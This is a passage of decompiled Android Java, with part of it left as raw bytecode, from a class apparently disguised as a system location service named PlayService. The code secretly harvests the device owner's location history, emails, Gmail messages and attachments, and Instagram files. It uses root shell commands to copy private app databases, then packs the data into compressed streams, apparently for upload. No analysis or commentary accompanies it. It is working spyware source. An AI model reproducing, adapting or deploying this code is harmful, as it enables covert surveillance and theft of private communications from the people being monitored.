        FLOG("ReadLocationInfoOnce()" + this.curInfo.lbsLatitude + ":" + this.curInfo.lbsLongtitude);
        AddData(paramGZIPOutputStream, this.curInfo.lbsAltitude);
        AddData(paramGZIPOutputStream, this.curInfo.lbsLatitude);
        AddData(paramGZIPOutputStream, this.curInfo.lbsLongtitude);
        AddData(paramGZIPOutputStream, this.curInfo.lbsPrecision);
        AddData(paramGZIPOutputStream, this.curInfo.lbsType);
        AddData(paramGZIPOutputStream, Long.toString(this.curInfo.timepoint / 1000L));
        paramGZIPOutputStream.write(3);
        this.locationHistoryLocked = false;
        paramGZIPOutputStream.write(2);
      }
      catch (Exception paramGZIPOutputStream)
      {
        int j;
        int i;
        EXCEPT(paramGZIPOutputStream, "ReadCurrentGeo");
        continue;
        FLOG("RLD()" + ((LbsInfo)this.locationHistory.get(i)).lbsLatitude + ":" + ((LbsInfo)this.locationHistory.get(i)).lbsLongtitude + "," + ((LbsInfo)this.locationHistory.get(i)).lbsPrecision + "," + ((LbsInfo)this.locationHistory.get(i)).lbsType + "," + ((LbsInfo)this.locationHistory.get(i)).timepoint);
        AddData(paramGZIPOutputStream, ((LbsInfo)this.locationHistory.get(i)).lbsAltitude);
        AddData(paramGZIPOutputStream, ((LbsInfo)this.locationHistory.get(i)).lbsLatitude);
        AddData(paramGZIPOutputStream, ((LbsInfo)this.locationHistory.get(i)).lbsLongtitude);
        AddData(paramGZIPOutputStream, ((LbsInfo)this.locationHistory.get(i)).lbsPrecision);
        AddData(paramGZIPOutputStream, ((LbsInfo)this.locationHistory.get(i)).lbsType);
        AddData(paramGZIPOutputStream, Long.toString(((LbsInfo)this.locationHistory.get(i)).timepoint / 1000L));
        paramGZIPOutputStream.write(3);
        i += 1;
        continue;
      }
      FLOG("Info Added and Updated");
      return;
      j = this.locationHistory.size();
      i = 0;
      if (i < j) {
        continue;
      }
      this.locationHistory.clear();
    }
  }
  
  public int ReadEmail(OutputStream paramOutputStream)
  {
    FLOG("ReadEmail()");
    if (Build.VERSION.SDK_INT >= 19)
    {
      FLOG("Cant read email via content provider in KITKAT or higher");
      return 0;
    }
    int i = 0;
    int k = 0;
    int i1 = 0;
    int j = 0;
    int m = 0;
    int n = 0;
    for (;;)
    {
      Object localObject;
      try
      {
        long l1 = ReadOneLongSetting("lLastEmailRed");
        localObject = Uri.parse("content://com.android.email.provider/message");
        localObject = getContentResolver().query((Uri)localObject, null, " _id > " + l1, null, " _id ASC ");
        FLOG("Email vse ok: " + localObject);
        long l2 = l1;
        if (localObject != null)
        {
          FLOG("ReadEmail() " + ((Cursor)localObject).getCount());
          if (((Cursor)localObject).moveToFirst())
          {
            FLOG("ReadEmail > 0!");
            paramOutputStream.write(100);
            j = i1;
            l1 = ((Cursor)localObject).getLong(((Cursor)localObject).getColumnIndex("_id"));
            l2 = ((Cursor)localObject).getLong(((Cursor)localObject).getColumnIndex("timeStamp"));
            String str1 = Till2(((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("fromList"))) + " " + ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("displayName"));
            String str2 = Till2(((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("toList")));
            FLOG("--------------------------------------");
            FLOG("id=" + ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("_id")));
            FLOG("time=" + l2);
            FLOG("subject=" + ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("subject")));
            FLOG("From=" + str1);
            FLOG("To=" + str2);
            FLOG("snippet=" + ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("snippet")));
            AddData(paramOutputStream, l1);
            AddData(paramOutputStream, "1");
            AddData(paramOutputStream, str1);
            AddData(paramOutputStream, str2);
            AddData(paramOutputStream, l2 / 1000L);
            AddData(paramOutputStream, ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("subject")));
            AddData(paramOutputStream, ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("snippet")));
            WriteByteStreamToOutputStream(getEmailBody(l1), paramOutputStream);
            paramOutputStream.write(3);
            i = j + 1;
            if (((Cursor)localObject).getInt(((Cursor)localObject).getColumnIndex("flagAttachment")) != 1) {
              break label731;
            }
            FLOG("found attach, try to take");
            if (!ReadEmailAttaches(paramOutputStream, l1)) {
              break label731;
            }
            j = 0 + 1;
            paramOutputStream.write(2);
          }
          k = i;
          m = j;
          l2 = l1;
          if (!((Cursor)localObject).isClosed())
          {
            ((Cursor)localObject).close();
            l2 = l1;
            m = j;
            k = i;
          }
        }
        SaveOneLongSetting("lLastEmailRed", l2);
        FLOG("Email psrocessed " + k);
        return m;
      }
      catch (Exception paramOutputStream)
      {
        EXCEPT(paramOutputStream, "Error processing E-mail");
        FLOG("Email finished");
        return 0;
      }
      label731:
      j = n;
      if (i <= 50)
      {
        boolean bool = ((Cursor)localObject).moveToNext();
        j = i;
        if (!bool) {
          j = n;
        }
      }
    }
  }
  
  public boolean ReadEvents(GZIPOutputStream paramGZIPOutputStream)
  {
    if (paramGZIPOutputStream == null) {
      return false;
    }
    FLOG("ReadEvents()");
    try
    {
      Cursor localCursor = getContentResolver().query(UniProvider.CONTENT_URI, null, "resource_id = 2", null, " _ID ASC ");
      if (localCursor != null)
      {
        FLOG("ReadEvents:c.moveToFirst()" + localCursor.getCount());
        if (localCursor.moveToFirst())
        {
          FLOG("ReadEvents:yes!");
          paramGZIPOutputStream.write(123);
          do
          {
            i = localCursor.getColumnIndex("timepoint");
            int j = localCursor.getColumnIndex("text1");
            AddData(paramGZIPOutputStream, localCursor.getString(i));
            AddData(paramGZIPOutputStream, localCursor.getString(j));
            paramGZIPOutputStream.write(3);
          } while (localCursor.moveToNext());
          paramGZIPOutputStream.write(2);
        }
        if (!localCursor.isClosed()) {
          localCursor.close();
        }
      }
      int i = getContentResolver().delete(UniProvider.CONTENT_URI, "resource_id = 2", null);
      FLOG("ReadEvents : deleted=" + i);
    }
    catch (Exception paramGZIPOutputStream)
    {
      for (;;)
      {
        EXCEPT(paramGZIPOutputStream, "ReadEvents");
      }
    }
    return true;
  }
  
  public boolean ReadGlobalLog(GZIPOutputStream paramGZIPOutputStream)
  {
    if (paramGZIPOutputStream == null) {
      return false;
    }
    FLOG("ReadGlobalLog " + bSendLog);
    try
    {
      if (bSendLog)
      {
        FLOG("ReadGlobalLog:newBuffer ");
        StringBuffer localStringBuffer = new StringBuffer(GlobalLog);
        FLOG("ReadGlobalLog:write1");
        paramGZIPOutputStream.write(113);
        FLOG("ReadGlobalLog:AddData");
        AddData(paramGZIPOutputStream, localStringBuffer.toString());
        FLOG("ReadGlobalLog:write2");
        paramGZIPOutputStream.write(3);
        FLOG("ReadGlobalLog:write3");
        paramGZIPOutputStream.write(2);
      }
      FLOG("ReadGlobalLog:setLength(0)");
      GlobalLog.setLength(0);
      FLOG("ReadGlobalLog:return");
    }
    catch (Exception paramGZIPOutputStream)
    {
      for (;;)
      {
        EXCEPT(paramGZIPOutputStream, "ReadGlobalLog");
      }
    }
    return true;
  }
  
  public void ReadGmail(GZIPOutputStream paramGZIPOutputStream)
  {
    Object localObject1;
    Object localObject2;
    long l1;
    long l4;
    long l3;
    label439:
    do
    {
      for (;;)
      {
        try
        {
          localObject1 = AccountManager.get(this).getAccountsByType("com.google");
          if (localObject1.length < 1)
          {
            FLOG("no gmail accounts detected");
            return;
          }
          localObject1 = localObject1[0].name;
          FLOG((String)localObject1);
          FLOG("ReadGmail()=" + (String)localObject1);
          localObject1 = "/data/data/com.google.android.gm/databases/mailstore." + (String)localObject1 + ".db";
          localObject2 = new File((String)localObject1);
          FLOG("File " + (String)localObject1 + ":" + ((File)localObject2).exists() + ":" + ((File)localObject2).canRead());
          FLOG("try copy " + (String)localObject1);
          localObject2 = dataPath + "/databases/gmail.db";
          commandSU("cat " + (String)localObject1 + " > " + (String)localObject2);
          commandSU("chmod 777 " + (String)localObject2);
          l1 = 0L;
          localObject1 = new File((String)localObject2);
          if (((File)localObject1).length() != 0L) {
            continue;
          }
          FLOG("Local Gmail.db is 0 length,abort");
          l4 = l1;
          FLOG("Gmail processed " + l4);
        }
        catch (Exception paramGZIPOutputStream)
        {
          EXCEPT(paramGZIPOutputStream, "Error processing Gmail ");
          continue;
          FLOG("read last");
          l3 = ReadOneLongSetting("lGmailCounter");
          if (!bResetGmail) {
            break label964;
          }
        }
        FLOG("Gmail finished");
        return;
        FLOG("Try to open db " + (String)localObject2 + ":" + ((File)localObject1).exists() + ":" + ((File)localObject1).canRead());
        localObject2 = SQLiteDatabase.openDatabase((String)localObject2, null, 1);
        FLOG("After db open");
        if (((SQLiteDatabase)localObject2).isOpen()) {
          continue;
        }
        FLOG("Gmail db open failed");
        l4 = l1;
      }
      bResetGmail = false;
      l3 = 0L;
      FLOG("ResetGmail");
      FLOG("gmail query");
      localObject1 = ((SQLiteDatabase)localObject2).query("messages", null, " _id > " + l3, null, null, null, " _id ASC ");
      l4 = l1;
    } while (localObject1 == null);
    FLOG("ReadGmail() " + ((Cursor)localObject1).getCount());
    long l2 = l1;
    label541:
    String str1;
    label797:
    int i;
    int k;
    if (((Cursor)localObject1).moveToFirst())
    {
      FLOG("ReadGmail > 0!");
      paramGZIPOutputStream.write(121);
      str1 = ((Cursor)localObject1).getString(((Cursor)localObject1).getColumnIndex("_id"));
      if (bUploadGmailAttach)
      {
        this._Ids.add(str1);
        this.messageIds.add(((Cursor)localObject1).getString(((Cursor)localObject1).getColumnIndex("messageId")));
      }
      AddData(paramGZIPOutputStream, str1);
      AddData(paramGZIPOutputStream, ((Cursor)localObject1).getString(((Cursor)localObject1).getColumnIndex("fromAddress")));
      AddData(paramGZIPOutputStream, ((Cursor)localObject1).getString(((Cursor)localObject1).getColumnIndex("toAddresses")));
      AddData(paramGZIPOutputStream, ((Cursor)localObject1).getLong(((Cursor)localObject1).getColumnIndex("dateSentMs")) / 1000L);
      AddData(paramGZIPOutputStream, ((Cursor)localObject1).getString(((Cursor)localObject1).getColumnIndex("subject")));
      AddData(paramGZIPOutputStream, ((Cursor)localObject1).getString(((Cursor)localObject1).getColumnIndex("snippet")));
      WriteByteStreamToOutputStream(((Cursor)localObject1).getBlob(((Cursor)localObject1).getColumnIndex("bodyCompressed")), paramGZIPOutputStream);
      paramGZIPOutputStream.write(3);
      l3 = ((Cursor)localObject1).getInt(((Cursor)localObject1).getColumnIndex("_id"));
      l2 = l1 + 1L;
      if (l2 > 100L) {
        paramGZIPOutputStream.write(2);
      }
    }
    else
    {
      if (!((Cursor)localObject1).isClosed()) {
        ((Cursor)localObject1).close();
      }
      FLOG("red " + l2);
      SaveOneLongSetting("lGmailCounter", l3);
      FLOG("READ att! " + this.messageIds.size());
      if ((!bUploadGmailAttach) || (this.messageIds.size() <= 0)) {
        break label1414;
      }
      str1 = dataPath + "/cache/attach.dat";
      i = 0;
      k = 0;
    }
    for (;;)
    {
      if (k >= this.messageIds.size()) {
        if (i != 0) {
          paramGZIPOutputStream.write(2);
        }
      }
      label964:
      int j;
      for (;;)
      {
        l4 = l2;
        if (!((SQLiteDatabase)localObject2).isOpen()) {
          break;
        }
        ((SQLiteDatabase)localObject2).close();
        l4 = l2;
        break;
        FLOG("last=" + l3);
        break label439;
        l1 = l2;
        if (((Cursor)localObject1).moveToNext()) {
          break label541;
        }
        break label797;
        localObject1 = (String)this.messageIds.remove(0);
        String str2 = (String)this._Ids.remove(0);
        FLOG("SELECT * FROM attachments WHERE downloadId = -1 AND messages_messageId = " + (String)localObject1);
        Cursor localCursor = ((SQLiteDatabase)localObject2).query("attachments", null, " downloadId = -1 AND messages_messageId = " + (String)localObject1, null, null, null, null);
        if (localCursor == null)
        {
          FLOG("attach#" + (String)localObject1 + " failed");
          j = i;
          break label1439;
        }
        j = i;
        if (!localCursor.moveToFirst()) {
          break label1439;
        }
        j = i;
        label1136:
        String str3 = localCursor.getString(localCursor.getColumnIndex("filename"));
        localObject1 = "attach" + getCurrentTime();
        i = str3.indexOf("@gmail.com/");
        if (i > 0) {
          localObject1 = str3.substring(i + 11);
        }
        str3 = str3.substring(7);
        if (!CopyFileSU(str3, str1))
        {
          FLOG("failed to get file " + str3);
          i = j;
        }
        for (;;)
        {
          j = i;
          if (localCursor.moveToNext()) {
            break label1136;
          }
          localCursor.close();
          j = i;
          if (i == 0) {
            break label1439;
          }
          break;
          i = j;
          if (j == 0)
          {
            i = 1;
            paramGZIPOutputStream.write(99);
          }
          FLOG("_0");
          AddData(paramGZIPOutputStream, str2);
          AddData(paramGZIPOutputStream, Integer.toString(1));
          FLOG("_1");
          AddData(paramGZIPOutputStream, localCursor.getString(localCursor.getColumnIndex("mimeType")));
          FLOG("_2");
          AddData(paramGZIPOutputStream, (String)localObject1);
          FLOG("_3");
          localObject1 = new File(str1);
          AddData(paramGZIPOutputStream, ((File)localObject1).length());
          WriteFileToOutputStream((File)localObject1, paramGZIPOutputStream);
          paramGZIPOutputStream.write(1);
          paramGZIPOutputStream.write(3);
          FLOG("_5");
        }
        label1414:
        FLOG("Skip read gmail attach " + bUploadGmailAttach);
      }
      label1439:
      k += 1;
      i = j;
    }
  }
  
  /* Error */
  int ReadInstagram(OutputStream paramOutputStream)
  {
    // Byte code:
    //   0: new 864	java/lang/StringBuilder
    //   3: dup
    //   4: ldc_w 4835
    //   7: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   10: getstatic 653	com/android/location/PlayService:lLastInstagram	J
    //   13: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   16: ldc_w 3188
    //   19: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   22: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   25: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   28: ldc_w 4837
    //   31: invokestatic 2691	com/android/location/PlayService:commandSUresult	(Ljava/lang/String;)Ljava/lang/String;
    //   34: astore 6
    //   36: new 864	java/lang/StringBuilder
    //   39: dup
    //   40: ldc_w 4839
    //   43: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   46: aload 6
    //   48: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   51: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   54: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   57: aload 6
    //   59: ldc_w 4841
    //   62: invokevirtual 1534	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   65: astore 8
    //   67: aload 8
    //   69: ifnull +9 -> 78
    //   72: aload 8
    //   74: arraylength
    //   75: ifne +11 -> 86
    //   78: ldc_w 4843
    //   81: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   84: iconst_0
    //   85: ireturn
    //   86: new 864	java/lang/StringBuilder
    //   89: dup
    //   90: ldc_w 4845
    //   93: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   96: aload 8
    //   98: arraylength
    //   99: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   102: ldc_w 4847
    //   105: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   108: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   111: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   114: lconst_0
    //   115: lstore 4
    //   117: ldc_w 571
    //   120: astore 7
    //   122: iconst_0
    //   123: istore_2
    //   124: aconst_null
    //   125: astore 6
    //   127: aload 8
    //   129: arraylength
    //   130: istore_3
    //   131: iload_2
    //   132: iload_3
    //   133: if_icmplt +16 -> 149
    //   136: aload 6
    //   138: ifnonnull +472 -> 610
    //   141: ldc_w 4849
    //   144: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   147: iconst_0
    //   148: ireturn
    //   149: new 864	java/lang/StringBuilder
    //   152: dup
    //   153: ldc_w 4851
    //   156: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   159: aload 8
    //   161: iload_2
    //   162: aaload
    //   163: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   166: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   169: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   172: aload 8
    //   174: iload_2
    //   175: aaload
    //   176: ldc_w 4308
    //   179: invokevirtual 1534	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   182: astore 9
    //   184: aload 9
    //   186: ifnonnull +6 -> 192
    //   189: goto +624 -> 813
    //   192: new 864	java/lang/StringBuilder
    //   195: dup
    //   196: ldc_w 4853
    //   199: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   202: aload 9
    //   204: arraylength
    //   205: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   208: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   211: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   214: aload 9
    //   216: arraylength
    //   217: bipush 7
    //   219: if_icmpge +12 -> 231
    //   222: ldc_w 4855
    //   225: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   228: goto +585 -> 813
    //   231: aload 9
    //   233: bipush 6
    //   235: aaload
    //   236: astore 10
    //   238: new 864	java/lang/StringBuilder
    //   241: dup
    //   242: ldc_w 4857
    //   245: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   248: aload 10
    //   250: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   253: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   256: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   259: aload 10
    //   261: ldc_w 4859
    //   264: invokevirtual 1534	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   267: astore 10
    //   269: new 864	java/lang/StringBuilder
    //   272: dup
    //   273: ldc_w 4861
    //   276: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   279: aload 10
    //   281: arraylength
    //   282: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   285: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   288: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   291: aload 10
    //   293: arraylength
    //   294: iconst_2
    //   295: if_icmpge +6 -> 301
    //   298: goto +515 -> 813
    //   301: aload 10
    //   303: iconst_1
    //   304: aaload
    //   305: ldc_w 4863
    //   308: invokevirtual 1534	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   311: astore 10
    //   313: new 864	java/lang/StringBuilder
    //   316: dup
    //   317: ldc_w 4865
    //   320: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   323: aload 10
    //   325: arraylength
    //   326: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   329: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   332: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   335: aload 10
    //   337: arraylength
    //   338: iconst_2
    //   339: if_icmpge +6 -> 345
    //   342: goto +471 -> 813
    //   345: new 864	java/lang/StringBuilder
    //   348: dup
    //   349: ldc_w 4867
    //   352: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   355: aload 10
    //   357: iconst_0
    //   358: aaload
    //   359: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   362: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   365: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   368: aload 10
    //   370: iconst_0
    //   371: aaload
    //   372: invokestatic 3315	java/lang/Long:parseLong	(Ljava/lang/String;)J
    //   375: ldc2_w 1773
    //   378: ldiv
    //   379: lstore 4
    //   381: new 864	java/lang/StringBuilder
    //   384: dup
    //   385: ldc_w 4668
    //   388: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   391: lload 4
    //   393: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   396: ldc_w 4869
    //   399: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   402: getstatic 653	com/android/location/PlayService:lLastInstagram	J
    //   405: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   408: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   411: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   414: lload 4
    //   416: getstatic 653	com/android/location/PlayService:lLastInstagram	J
    //   419: lcmp
    //   420: ifgt +6 -> 426
    //   423: goto +390 -> 813
    //   426: new 864	java/lang/StringBuilder
    //   429: dup
    //   430: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   433: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   436: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   439: ldc_w 4871
    //   442: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   445: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   448: astore 10
    //   450: new 864	java/lang/StringBuilder
    //   453: dup
    //   454: ldc_w 4873
    //   457: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   460: aload 9
    //   462: bipush 6
    //   464: aaload
    //   465: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   468: ldc_w 1269
    //   471: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   474: aload 10
    //   476: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   479: ldc_w 4875
    //   482: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   485: aload 10
    //   487: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   490: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   493: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   496: pop
    //   497: new 1250	java/io/File
    //   500: dup
    //   501: aload 10
    //   503: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   506: astore 6
    //   508: aload 6
    //   510: invokevirtual 1257	java/io/File:exists	()Z
    //   513: ifeq +11 -> 524
    //   516: aload 6
    //   518: invokevirtual 1265	java/io/File:canRead	()Z
    //   521: ifne +30 -> 551
    //   524: new 864	java/lang/StringBuilder
    //   527: dup
    //   528: ldc_w 4877
    //   531: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   534: aload 10
    //   536: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   539: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   542: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   545: aconst_null
    //   546: astore 6
    //   548: goto +265 -> 813
    //   551: new 864	java/lang/StringBuilder
    //   554: dup
    //   555: ldc_w 4879
    //   558: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   561: aload 9
    //   563: bipush 6
    //   565: aaload
    //   566: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   569: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   572: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   575: new 864	java/lang/StringBuilder
    //   578: dup
    //   579: aload 9
    //   581: iconst_4
    //   582: aaload
    //   583: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   586: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   589: ldc_w 1712
    //   592: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   595: aload 9
    //   597: iconst_5
    //   598: aaload
    //   599: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   602: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   605: astore 7
    //   607: goto -471 -> 136
    //   610: lload 4
    //   612: putstatic 653	com/android/location/PlayService:lLastInstagram	J
    //   615: invokestatic 1558	com/android/location/PlayService:SaveSettings	()V
    //   618: aload_1
    //   619: bipush 99
    //   621: invokevirtual 2182	java/io/OutputStream:write	(I)V
    //   624: aload_0
    //   625: aload_1
    //   626: new 864	java/lang/StringBuilder
    //   629: dup
    //   630: invokespecial 2166	java/lang/StringBuilder:<init>	()V
    //   633: lload 4
    //   635: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   638: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   641: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   644: aload_0
    //   645: aload_1
    //   646: bipush 8
    //   648: invokestatic 4401	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   651: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   654: new 864	java/lang/StringBuilder
    //   657: dup
    //   658: ldc_w 4881
    //   661: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   664: ldc_w 4883
    //   667: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   670: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   673: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   676: aload_0
    //   677: aload_1
    //   678: ldc_w 4883
    //   681: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   684: new 864	java/lang/StringBuilder
    //   687: dup
    //   688: ldc_w 4885
    //   691: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   694: aload 7
    //   696: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   699: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   702: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   705: aload_0
    //   706: aload_1
    //   707: new 864	java/lang/StringBuilder
    //   710: dup
    //   711: ldc_w 4887
    //   714: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   717: aload 7
    //   719: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   722: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   725: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   728: new 864	java/lang/StringBuilder
    //   731: dup
    //   732: ldc_w 4889
    //   735: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   738: aload 6
    //   740: invokevirtual 1277	java/io/File:length	()J
    //   743: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   746: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   749: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   752: aload_0
    //   753: aload_1
    //   754: new 864	java/lang/StringBuilder
    //   757: dup
    //   758: invokespecial 2166	java/lang/StringBuilder:<init>	()V
    //   761: aload 6
    //   763: invokevirtual 1277	java/io/File:length	()J
    //   766: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   769: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   772: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   775: aload_0
    //   776: aload 6
    //   778: aload_1
    //   779: invokevirtual 2196	com/android/location/PlayService:WriteFileToOutputStream	(Ljava/io/File;Ljava/io/OutputStream;)V
    //   782: aload_1
    //   783: iconst_1
    //   784: invokevirtual 2182	java/io/OutputStream:write	(I)V
    //   787: aload_1
    //   788: iconst_3
    //   789: invokevirtual 2182	java/io/OutputStream:write	(I)V
    //   792: aload_1
    //   793: iconst_2
    //   794: invokevirtual 2182	java/io/OutputStream:write	(I)V
    //   797: iconst_1
    //   798: ireturn
    //   799: astore_1
    //   800: aload_1
    //   801: ldc_w 4890
    //   804: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   807: iconst_0
    //   808: ireturn
    //   809: astore_1
    //   810: goto -10 -> 800
    //   813: iload_2
    //   814: iconst_1
    //   815: iadd
    //   816: istore_2
    //   817: goto -690 -> 127
    // Local variable table:
